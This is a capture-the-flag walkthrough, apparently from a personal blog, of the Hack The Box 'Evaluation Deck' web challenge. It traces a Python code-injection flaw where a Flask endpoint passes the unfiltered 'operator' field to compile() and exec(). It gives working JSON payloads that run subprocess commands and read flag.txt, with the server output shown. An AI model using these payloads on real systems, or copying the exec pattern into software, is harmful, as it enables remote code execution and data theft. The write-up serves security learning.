---
title: "Evaluation Deck"
date: 2022-10-28 00:00:00 +0800
categories: [Walkthrough, Hack The Box]
tags: [Hack The Boo 2022]
---

## Details
- Platform: [Hack The Box](/categories/hack-the-box/)
- Event: [Hack The Boo 2022](/tags/hack-the-boo-2022/)

## Setting
>  A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

## Walkthrough
Firstly I just played the game to understand the intended functionality.
![img1](/assets/img/Screenshot 2022-10-23 at 01.05.43.png)
_Evaluation Deck - Mid Game_

To be honest, I had no idea what was going on at first. I turned over some cards and the ghost would seemingly get dealt some damage or for some reason restore its health. I couldnt see any correlation to the damage or health restoration in the GUI, so I decided to look for answers in the source code.
![img2](/assets/img/Screenshot 2022-10-23 at 01.06.00.png)
_Evaluation Deck - Victory State_

Looking through the source code, I found power and operator attributes which looked interesting. It seemed like they were being used to calculate damage to the ghost. The `operator` attribute for decreasing or adding health, and the `power` attribute to specify how much. If that calculation is done on the server, this could lead to some code injection.
![img3](/assets/img/Pasted image 20221028162029.png)
_power and operator attributes!_

I tested it out by changing the `power` and `operator` attribute values and I could now control the game. I was now able to lose. It's actually really difficult to lose this game 😂

![img4](/assets/img/Screenshot 2022-10-23 at 01.07.54.png)
_Evaluation Deck - Game Over State_

I couldn't find any Javascript scripts doing any health management logic, so I checked out the requests made. I tapped a card and saw that a request was made to `/api/get_health` with the following JSON payload:
```json
{
	"current_health":"100",
	"attack_power":"20",
	"operator":"-"
}
```

If you check the provided code, you can see that the application is made with Python and Flask, but you could also find this out with some OSINT and/or Enumeration.

Time to try some code injection. You could argue that `attack_power` is a number so it might be limited to or parsed as a number on the backend, but you could also argue that there is only 2 operaters used in the game and there might be a filter to see if the input is one of those 2 operators. So going in blind, I would just try both.
But as we have the code, we can see that the operator has no restrictions on it.

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power') #← html attribute 1 
    operator = data.get('operator') #← html attribute 2
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec') #← compile() is used. major red flag!
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

the f-string `f'result = {int(current_health)} {operator} {int(attack_power)}'` shows the operator variable is plopped in the middle with no filtering or casting, so I crafted a python payload to test if I could run some system level commands:

```json
{
	"current_health":"100",
	"attack_power":"78",
	"operator":"if False else __import__('subprocess').run(['ls', '../', '-la'], capture_output=True).stdout.decode('ASCII')#"
}
```

and I could!

```json
"message": "total 72\ndrwxr-xr-x 1 root root 4096 Oct 22 15:45 .\ndrwxr-xr-x 1 root root 4096 Oct 22 15:45 ..\ndrwxr-xr-x 1 root root 4096 Oct 21 15:07 app\ndrwxr-xr-x 1 root root 4096 Oct 14 00:44 bin\ndrwxr-xr-x 5 root root 360 Oct 22 15:45 dev\ndrwxr-xr-x 1 root root 4096 Oct 22 15:45 etc\n-rw-r--r-- 1 root root 32 Oct 21 13:33 flag.txt\ndrwxr-xr-x 2 root root 4096 Aug 9 08:47 home\ndrwxr-xr-x 1 root root 4096 Oct 14 00:44 lib\ndrwxr-xr-x 5 root root 4096 Aug 9 08:47 media\ndrwxr-xr-x 2 root root 4096 Aug 9 08:47 mnt\ndrwxr-xr-x 2 root root 4096 Aug 9 08:47 opt\ndr-xr-xr-x 376 root root 0 Oct 22 15:45 proc\ndrwx------ 1 root root 4096 Oct 21 15:06 root\ndrwxr-xr-x 1 root root 4096 Oct 22 15:45 run\ndrwxr-xr-x 2 root root 4096 Aug 9 08:47 sbin\ndrwxr-xr-x 2 root root 4096 Aug 9 08:47 srv\ndr-xr-xr-x 13 root root 0 Oct 22 15:45 sys\ndrwxrwxrwt 1 root root 4096 Oct 22 15:45 tmp\ndrwxr-xr-x 1 root root 4096 Oct 21 15:06 usr\ndrwxr-xr-x 1 root root 4096 Oct 14 00:44 var\n"
```

Now I know I have access to the server, I could try to get a reverse shell, but knowing where the flag is due to the provided code, I could just change the system command to `cat` the flag (print it out to the standard output).

```json
{
	"current_health":"100",
	"attack_power":"78",
	"operator":"if False else __import__('subprocess').run(['cat', '../flag.txt'], capture_output=True).stdout.decode('ASCII')#"
}
```

and the response sends back the flag!

```json
{
	"message": "HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}"
}
```

#### Alternative Payload
Looking at the backend code, I know that the variable `result` stores the message that the server is sending back to me:
```python
result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec') #← compile() is used. red flag!
        exec(code, result) #← exec() is used with compile(). major red flag!
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

So I could alternatively use a payload where I set `result` to the contents of the flag:
```json
{
	"current_health":"100",
	"attack_power":"65",
	"operator":";result=open('../flag.txt').read()#"
}
```